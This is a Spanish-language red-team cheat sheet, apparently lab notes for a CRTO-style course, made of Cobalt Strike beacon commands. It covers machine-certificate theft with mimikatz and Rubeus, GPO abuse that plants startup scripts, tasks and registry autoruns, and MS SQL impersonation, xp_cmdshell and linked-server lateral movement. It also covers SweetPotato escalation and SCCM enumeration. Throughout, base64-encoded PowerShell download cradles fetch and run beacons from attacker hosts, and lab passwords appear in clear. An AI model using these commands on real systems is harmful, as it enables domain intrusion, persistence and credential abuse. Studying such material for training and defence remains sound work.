# Esto requiere una sesión elevada (privilegios SYSTEM o Administrador).
beacon> mimikatz !crypto::certificates /systemstore:local_machine /export

# 2. Codificar el archivo PFX exportado a Base64 para que sea compatible con Rubeus.
ubuntu@DESKTOP-3BSK7NO > cat /mnt/c/Users/Attacker/Desktop/local_machine_My_0_wkstn-1.dev.cyberbotic.io.pfx | base64 -w 0

# 3. Codificar el certificado exportado en Base64 y usarlo para solicitar un TGT de la cuenta de máquina.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:WKSTN-1$ /enctype:aes256 /certificate:MIINCA[...]IH0A== /password:mimikatz /nowrap

# 4. Inyectar el TGT en una sesión sacrificial.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:WKSTN-1$ /password:FakePass /ticket:doIGY<SNIPPED>5pbw==

# 5. Robar el token e interactuar con el servicio remoto.
beacon> steal_token 1234

# 6. Si el certificado de la máquina no está almacenado, solicitar uno utilizando Certify.
# El parámetro `/machine` eleva automáticamente los privilegios al nivel SYSTEM para la solicitud.
beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:Machine /machine
```

---
# Group Policy

## Modify Existing GPO
```r
# 1. Importar PowerView.ps1.
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1  

# 2. Enumerar los GPOs del dominio y filtrar aquellos donde el usuario actual tiene privilegios de modificación.
# Esto busca privilegios como CreateChild, WriteProperty o GenericWrite, excluyendo principales legítimos como SYSTEM, Domain Admins y Enterprise Admins.
beacon> powerpick Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty|GenericWrite" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }

# 3. Convertir el SecurityIdentifier a su formato legible para identificar el principal.
# Esto nos ayuda a conocer qué grupo o usuario tiene permisos de modificación sobre el GPO.
beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
# Esto nos muestra que los miembros del grupo "Developers" pueden modificar "Vulnerable GPO".

# 4. Usar `Get-DomainGPO` para resolver el nombre del GPO (`displayName`) y su ruta (`gpcFileSysPath`).
beacon> powerpick Get-DomainGPO -Identity "CN={5059FAC1-5E94-4361-95D3-3BB235A23928},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" | select displayName, gpcFileSysPath
# Resultado esperado: Vulnerable GPO \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}

# 5. Identificar la OU del dominio a la que está vinculado el GPO.
# Esto se realiza buscando el GUID del GPO en la propiedad `gPLink` de las OUs del dominio.
beacon> powerpick Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName

# 6. Identificar las computadoras que pertenecen a la OU especificada.
# Usamos el nombre distinguido (`distinguishedName`) de la OU como base de búsqueda.
beacon> powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName

# 7. Para modificar un GPO sin el uso de GPMC (Group Policy Management Console), modificar directamente los archivos asociados en SYSVOL (el gpcFileSysPath).
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{5059FAC1-5E94-4361-95D3-3BB235A23928}
```

### SharpGPOAbuse - `Computer Startup Script` Attack
```r
# 1. Buscar un recurso compartido accesible donde subir el payload.
# Esto identifica los recursos compartidos en el dominio donde el usuario actual tiene permisos de escritura.
beacon> powerpick Find-DomainShare -CheckShareAccess

# 2. Subir payload al recurso compartido DC-2
beacon> cd \\dc-2\software
beacon> upload C:\Payloads\dns_x64.exe
beacon> ls

# 3. Ejemplo utilizando `Computer Startup Script`. Este colocará un script de inicio en SYSVOL que se ejecutará cada vez que una computadora afectada inicie.
beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\software\dns_x64.exe" --GPOName "Vulnerable GPO"

# 4. Iniciar sesión en la consola de WKSTN-1 y ejecutar `gpupdate /force`. Luego reiniciar la máquina y así obtener un `DNS Beacon` como SYSTEM.
beacon> run gpupdate /force
beacon> checkin
```

### SharpGPOAbuse - `Computer Task Script` Attack
```r
# 1. Configurar un listener de pivot (puerto 1234) en el beacon y preparar un download cradle apuntando al puerto 80.
# WKSTN-2 Beacon -> Pivoting -> Listener...
#[Referencia: https://pub-1041bb23829741158103300e5eeabcee.r2.dev/Files/pivot.png]

# Attacks -> Scripted Web Delivery (S)
#[Referencia: https://pub-1041bb23829741158103300e5eeabcee.r2.dev/Files/pivot2.png]

# Output:
# IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/b'))

# Modificarlo a:
# IEX (new-object net.webclient).downloadstring("http://10.10.123.102:8080/b")

# Base64: SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA=

# 2. Habilitar el tráfico entrante en los puertos del Listener (1234) y del WebDrive (8080).
# Esto requiere acceso SYSTEM []()para modificar las reglas del firewall.
beacon> powerpick New-NetFirewallRule -DisplayName "Rule 1" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444
beacon> powerpick New-NetFirewallRule -DisplayName "Rule 2" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080

# 3. Configurar una regla de redirección de puertos para aceptar solicitudes de descarga localmente y reenviarlas al servidor del equipo.
# Esto permite que el payload sea servido desde el team server en el puerto 80.
beacon> rportfwd 8080 127.0.0.1 80

# 4. Usar `SharpGPOAbuse` para agregar una tarea programada al GPO objetivo.
# Esta tarea ejecutará un payload codificado en PowerShell en las máquinas afectadas.
beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "C:\Windows\System32\cmd.exe" --Arguments "/c powershell -w hidden -enc base64" --GPOName "Vulnerable GPO"

# 5. Forzar la aplicación del cambio en el GPO para que sea efectivo.
# Esto obliga a los sistemas afectados por el GPO a aplicar la nueva configuración inmediatamente.
beacon> run gpupdate /force
```

## Create & Link a GPO
```r
# Crear y Vincular una Nueva GPO Maliciosa

# 1. Verificar si tienes permisos para crear un nuevo GPO en el dominio.
# Esto busca permisos de "CreateChild" en el contenedor de Políticas de Grupo.
beacon> powerpick Get-DomainObjectAcl -Identity "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }

# 2. Identificar OUs donde un principal tiene permisos "Write gPlink" para vincular la GPO.
beacon> powerpick Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl

# Convertir el SID para identificar el grupo o usuario que tiene esos permisos.
beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
# Resultado esperado: DEV\Developers

# 3. Verificar si el módulo RSAT para GPOs está instalado.
# Este módulo es necesario para la manipulación de GPOs.
beacon> powerpick Get-Module -List -Name GroupPolicy | select -expand ExportedCommands

# 4. Crear una nueva GPO maliciosa.
beacon> powerpick New-GPO -Name "Evil GPO"

# 5. Buscar un recurso compartido accesible donde subir el payload.
# Esto identifica los recursos compartidos en el dominio donde el usuario actual tiene permisos de escritura.
beacon> powerpick Find-DomainShare -CheckShareAccess

# 6. Subir payload al recurso compartido DC-2
beacon> cd \\dc-2\software
beacon> upload C:\Payloads\dns_x64.exe
beacon> ls

# 7. Configurar la GPO para agregar un autorun al registro (Registry Autorun) que ejecute un binario malicioso.
beacon> powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\dns_x64.exe" -Type ExpandString

# 8. Vincular la GPO creada a la OU objetivo.
# Esto asegura que la configuración de la GPO se aplique a los sistemas dentro de esa OU.
beacon> powershell Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"

# NOTA: Los autoruns en HKLM requieren un reinicio del sistema para ejecutarse.
```


# MS SQL Servers

## MS SQL Enumeration
### PowerUpSQL
```r
# 1. Importar el módulo PowerUpSQL para comenzar con la enumeración.
beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1

# 2.1 Enumerar instancias SQL en el dominio buscando SPNs que comiencen con MSSQL*.
beacon> powershell Get-SQLInstanceDomain

# 2.2 Enumerar instancias SQL en la red usando el método de broadcast.
beacon> powershell Get-SQLInstanceBroadcast

# 2.3 Escanear la red para instancias SQL abiertas utilizando escaneo UDP.
beacon> powershell Get-SQLInstanceScanUDP

# 3. Probar si podemos conectarnos a una base de datos específica.
beacon> powershell Get-SQLConnectionTest -Instance "sql-2.dev.cyberbotic.io,1433" | fl

# 4. Recopilar información detallada de una instancia SQL accesible.
beacon> powershell Get-SQLServerInfo -Instance "sql-2.dev.cyberbotic.io,1433"

# Automatizar la enumeración de múltiples SQL Servers accesibles en el dominio.
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo

# Emitir consultas SQL contra una instancia accesible.
# NOTA: Se requiere tener permisos válidos para interactuar con la instancia.
beacon> powershell Get-SQLQuery -Instance "sql-2.dev.cyberbotic.io,1433" -Query "select @@servername"

```

### SQLRecon
```r
# 1. Enumerar servidores MS SQL a través de SPNs.
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /enum:sqlspns

# 2. Obtener información sobre la instancia con el módulo `info`.
# La opción `/auth:wintoken` permite a SQLRecon usar el token de acceso del Beacon.
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io /module:info

# 3. Determinar qué roles y permisos tiene el usuario actual en la instancia SQL.
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:whoami

# 4. Encontrar un usuario (o grupo) que tenga acceso a instancias SQL.
# Sin acceso directo para consultar la instancia SQL, una opción es buscar grupos de dominio relacionados con SQL y listar sus miembros.
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1  

beacon> powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }

# 5.1 Ir tras la cuenta de servicio de MS SQL, ya que a menudo tiene privilegios de sysadmin.
# Las credenciales de la cuenta pueden usarse con `make_token` en Beacon y `/auth:wintoken` en SQLRecon.
beacon> make_token DEV\mssql_svc Cyberb0tic
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:whoami

# 5.2 Usar la opción `/auth:windomain` con `/d:<domain> /u:<username> /p:<password>` para autenticación directa en SQLRecon.
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:windomain /domain:dev.cyberbotic.io /u:mssql_svc /p:Cyberb0tic /host:sql-2.dev.cyberbotic.io,1433 /module:whoami

# 6. Ejecutar consultas SQL directamente utilizando el módulo `query`.
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:query /c:"select @@servername"

```

### Impacket-mssqlclient + proxychains
```r
## Impacket-mssqlclient + Proxychains

# 1. Habilitar Socks Proxy en la sesión de beacon (Usar SOCKS 5 para mejor OPSEC).
beacon> socks 1080 socks5 disableNoAuth 3ky 3kyRoad2CRTO enableLogging

# 2. Verificar el estado del SOCKS proxy en el team server.
attacker@ubuntu > sudo ss -lpnt

# 3. Configurar Proxychains en WSL para enrutar tráfico hacia el proxy SOCKS.
ubuntu@DESKTOP-3BSK7NO > sudo nano /etc/proxychains.conf
socks5 10.10.5.50 1080 3ky 3kyRoad2CRTO

# 4. Conectar a la instancia MS SQL utilizando Impacket-mssqlclient a través de Proxychains.
ubuntu@DESKTOP-3BSK7NO > proxychains mssqlclient.py -windows-auth DEV/bfarmer@10.10.122.25
# Una vez conectado, puedes ejecutar comandos SQL.
SQL> select @@servername;
```

## MS SQL Impersonation

### Manual Way to Impersonate
```r
# 1. Descubrir cuentas que tienen permisos para impersonar a otros usuarios.
SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';

# 2. Consultar los IDs principales y sus detalles.
SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;

# 3. Relacionar directamente los grantee_principal_id y grantor_principal_id para identificar relaciones de impersonación.
SELECT p.permission_name, g.name AS grantee_name, r.name AS grantor_name 
FROM sys.server_permissions p 
JOIN sys.server_principals g ON p.grantee_principal_id = g.principal_id 
JOIN sys.server_principals r ON p.grantor_principal_id = r.principal_id 
WHERE p.permission_name = 'IMPERSONATE';

# 4. Comprobar el usuario actual conectado a la instancia SQL.
SELECT SYSTEM_USER;
# Resultado esperado: DEV\bfarmer

# 5. Verificar si el usuario actual tiene el rol de sysadmin.
SELECT IS_SRVROLEMEMBER('sysadmin');
# Resultado esperado: 0 (No tiene el rol de sysadmin).

# 6. Asumir el contexto de mssql_svc usando EXECUTE AS.
EXECUTE AS login = 'DEV\mssql_svc'; SELECT SYSTEM_USER;
# Resultado esperado: DEV\mssql_svc

# 7. Verificar si mssql_svc tiene el rol de sysadmin.
EXECUTE AS login = 'DEV\mssql_svc'; SELECT IS_SRVROLEMEMBER('sysadmin');
# Resultado esperado: 1 (Tiene el rol de sysadmin).
```
### SQLRecon
```r
# 1. Usar SQLRecon para identificar cuentas que pueden ser impersonadas.
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:impersonate

# 2. Ejecutar consultas en el contexto de una cuenta impersonada con SQLRecon.
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:iwhoami /i:DEV\mssql_svc

# 3. Verificar permisos y roles del usuario impersonado.
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /i:DEV\mssql_svc /module:iquery /c:"SELECT IS_SRVROLEMEMBER('sysadmin');"
```

## MS SQL Command Execution

### Manual Way to Enable and Use xp_cmdshell
```r
# 1. Intentar ejecutar un comando con xp_cmdshell directamente.
SQL> EXEC xp_cmdshell 'whoami';
# [-] ERROR(SQL-2): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server.

# 2. Verificar el estado actual de xp_cmdshell para confirmar si está deshabilitado.
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';

# 3. Habilitar xp_cmdshell. Esto requiere privilegios de sysadmin.
sp_configure 'show advanced options', 1; RECONFIGURE;
sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# 4. Confirmar que xp_cmdshell ha sido habilitado correctamente.
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';

# 5. Intentar ejecutar nuevamente un comando shell usando xp_cmdshell.
SQL> EXEC xp_cmdshell 'whoami';
# Resultado esperado: DEV\MSSQL_SVC
```

###  PowerUPSQL
```r
# Importar el módulo PowerUpSQL para comenzar con la enumeración.
beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1

# _xp_cmdshell_ puede ser utilizado para ejecutar comandos shell en el servidor SQL si tienes privilegios de sysadmin.
# `Invoke-SQLOSCmd` de PowerUpSQL proporciona un medio sencillo para aprovechar esta funcionalidad.

# Ejemplo: Ejecutar un comando shell (en este caso, `whoami`) en el servidor SQL utilizando PowerUpSQL.
beacon> powershell Invoke-SQLOSCmd -Instance "sql-2.dev.cyberbotic.io,1433" -Command "whoami" -RawResults
```

### SQLRecon
```r
# Habilitar xp_cmdshell utilizando SQLRecon en combinación con el módulo de impersonación.
execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:ienablexp /i:DEV\mssql_svc

# Ejecutar un comando a través de xp_cmdshell usando SQLRecon en el contexto de 'DEV\mssql_svc'.
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:ixpcmd /i:DEV\mssql_svc /c:ipconfig
```

### Payload Beacon Deployment
```r
# 1. Identificar el hostname del sistema objetivo.
beacon> run hostname
wkstn-2

# 2. Verificar el usuario actual y sus privilegios.
beacon> getuid
[*] You are DEV\bfarmer (admin)

# 3. Crear una regla de firewall para permitir tráfico en el puerto 8080 (requerido para Web Delivery).
# Requiere un usuario con privilegios escalados
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

# 4. Configurar un Reverse Port Forward para redirigir el tráfico del puerto 8080 al 80 en el team server.
beacon> rportfwd 8080 127.0.0.1 80

# 5. Configurar un listener de smb_x64.ps1 (/b) en el beacon y preparar un download cradle apuntando al puerto 80.
#Attacks -> Scripted Web Delivery (S) 
#[Referencia: https://pub-1041bb23829741158103300e5eeabcee.r2.dev/Files/sql_smb.png]

# Output:
# IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/b'))

# Modificarlo a:
# IEX (new-object net.webclient).downloadstring("http://10.10.123.102:8080/b")

# Base64: SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA=

# 6. Utilizar el payload con `xp_cmdshell` para ejecutarlo en el servidor SQL.

# 6.1 Usar SQL para ejecutar el payload Base64 con xp_cmdshell.
SQL> EXEC xp_cmdshell 'powershell -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA=';

# 6.2 Usar SQLRecon para ejecutar el comando directamente en el servidor.
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:ixpcmd /i:DEV\mssql_svc /c:"powershell -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADMALgAxADAAMgA6ADgAMAA4ADAALwBiACIAKQA="

# 7. Establecer un vínculo con el Beacon en el servidor SQL.
beacon> link sql-2.dev.cyberbotic.io TSVCPIPE-89dd8075-89e1-4dc8-aeab-dde50401337
```

## MS SQL Lateral Movement

### Manual Way to (Texto aqui)
```r
# 1. Descubrir cualquier link que tenga la instancia actual
SELECT srvname, srvproduct, rpcout FROM master..sysservers;

# 2. Enviar consultas SQL a servidores vinculados usando OpenQuery
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername');

# 3. Habilitar xp_cmdshell en un servidor vinculado (requiere que RPC Out esté habilitado en el link)
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql-1.cyberbotic.io];
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql-1.cyberbotic.io];
```

### SQLRecon
```r
# 1. Descubrir cualquier link que tenga la instancia actual
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:links

# 2. Enviar consultas SQL a servidores vinculados
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:lquery /l:sql-1.cyberbotic.io /c:"select @@servername"

# 3. Verificar el estado de xp_cmdshell en un servidor vinculado
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:lquery /l:sql-1.cyberbotic.io /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"

# 4. Consultar SQL-1 para averiguar si tiene más links
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:llinks /l:sql-1.cyberbotic.io

# 5. Identificar el nivel de privilegios en SQL-1 usando lwhoami
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:lwhoami /l:sql-1.cyberbotic.io
```

### PowerUPSQL
```r
# Realizar un rastreo automático de todos los links disponibles en la instancia SQL y mostrar información relevante para cada uno
beacon> powershell Get-SQLServerLinkCrawl -Instance "sql-2.dev.cyberbotic.io,1433"
```

### Payload Beacon Deployment for Lateral Movement
```r
# 1. Identificar el hostname del sistema objetivo.
beacon> run hostname
sql-2

# 2. Verificar el usuario actual y sus privilegios.
beacon> getuid
[*] You are DEV\mssql_svc (admin)

# 3. Crear una regla de firewall para permitir tráfico en el puerto 8080 (requerido para Web Delivery).
# Requiere un usuario con privilegios escalados
beacon> powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080

# [!] Importante es parar los tuneles abiertos (ejemplo en WKSTN-2)
beacon> rportfwd 8080 127.0.0.1 80

# 5. Configurar un listener de smb_x64.ps1 (/c) en el beacon y preparar un download cradle apuntando al puerto 80.
# Site Management -> Host File
#[Referencia: https://pub-1041bb23829741158103300e5eeabcee.r2.dev/Files/sql_smbx64ps1.png]

# Output:
# IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/c'))

# Modificarlo a:
# IEX (new-object net.webclient).downloadstring("http://10.10.122.25:8080/c")

# Base64: SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADIALgAyADUAOgA4ADAAOAAwAC8AYwAiACkA

# 5.1. Usar `xp_cmdshell` en un servidor vinculado con OpenQuery.
SELECT * FROM OPENQUERY("sql-1.cyberbotic.io", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADIALgAyADUAOgA4ADAAOAAwAC8AYwAiACkA''')

# 5.2. Usar la sintaxis "AT".
EXEC('xp_cmdshell ''powershell -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADIALgAyADUAOgA4ADAAOAAwAC8AYwAiACkA''') AT [sql-1.cyberbotic.io]


# 5.3. Utilizar SQLRecon para ejecutar comandos en un servidor vinculado.
beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /auth:wintoken /host:sql-2.dev.cyberbotic.io,1433 /module:lxpcmd /l:sql-1.cyberbotic.io /c:'powershell -w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADIALgAyADUAOgA4ADAAOAAwAC8AYwAiACkA'

# 6. Una vez que se ha ejecutado el payload, conecta con el Beacon.
beacon> link sql-1.cyberbotic.io TSVCPIPE-89dd8075-89e1-4dc8-aeab-dde50401337
```

## MS SQL Privilege Escalation
```r
# 1. Verificar el usuario en ejecución y sus privilegios.
# Esta instancia de SQL se está ejecutando como NT Service\MSSQLSERVER, que es la configuración predeterminada en instalaciones más modernas de SQL. Tiene un tipo especial de privilegio llamado _SeImpersonatePrivilege_, que permite a la cuenta "suplantar a un cliente después de la autenticación".
beacon> getuid
[*] You are NT Service\MSSQLSERVER

# 2. Enumerar los privilegios del token actual.
# Se utiliza Seatbelt para confirmar que el privilegio `SeImpersonatePrivilege` está habilitado.
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges

# 3. Configurar un listener de tcp-local_x64.ps1 (/d) en el beacon y preparar un download cradle apuntando al puerto 80.
# Site Management -> Host File
#[Referencia: https://pub-1041bb23829741158103300e5eeabcee.r2.dev/Files/sql_tcp-localx64ps1.png]

# Output:
# IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/d'))

# Modificarlo a:
# IEX (new-object net.webclient).downloadstring("http://10.10.122.25:8080/d")

# Base64: SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADIALgAyADUAOgA4ADAAOAAwAC8AZAAiACkA

# 4. Utilizar SweetPotato para explotar el privilegio `SeImpersonatePrivilege` y escalar privilegios.
# SweetPotato explota el privilegio para suplantar un token SYSTEM y ejecutar un payload.
beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc SQBFAFgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAyADIALgAyADUAOgA4ADAAOAAwAC8AZAAiACkA"
# Base64: iex (new-object net.webclient).downloadstring('http://sql-2.dev.cyberbotic.io:8080/d')

# 4. Conectar al beacon escalado.
# Conectar al puerto local donde se estableció el beacon elevado.
beacon> connect localhost 4444
```

---

# Configuration Manager

## Enumeration
```r
## Enumeration

# 1. Identificar el hostname del sistema actual.
beacon> run hostname
wkstn-2

# 2. Verificar el usuario actual.
beacon> getuid
[*] You are DEV\bfarmer

# 3. Encontrar el punto de gestión y el código de sitio al que está vinculado.
# Esto no requiere privilegios especiales en el dominio, en SCCM o en el endpoint.
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local site-info --no-banner

# 4. Verificar el DACL en el contenedor `CN=System Management` en AD para las máquinas con control total sobre él.
# Esto es un requisito previo para la configuración de SCCM en un dominio.
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get site-info -d cyberbotic.io --no-banner

# 5. Enumerar todas las colecciones visibles para el usuario actual (bfarmer).
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner

# 6. Cambiar de usuario a jking (miembro de DEV\Support Engineers) para enumerar las colecciones visibles con permisos diferentes.
# Esto demuestra cómo los roles y alcances afectan la visibilidad de SCCM.
beacon> make_token DEV\jking Qwerty123
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner

# 7. Encontrar usuarios administrativos en SCCM.
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get class-instances SMS_Admin --no-banner

# 8. Enumerar los miembros de una colección específica.
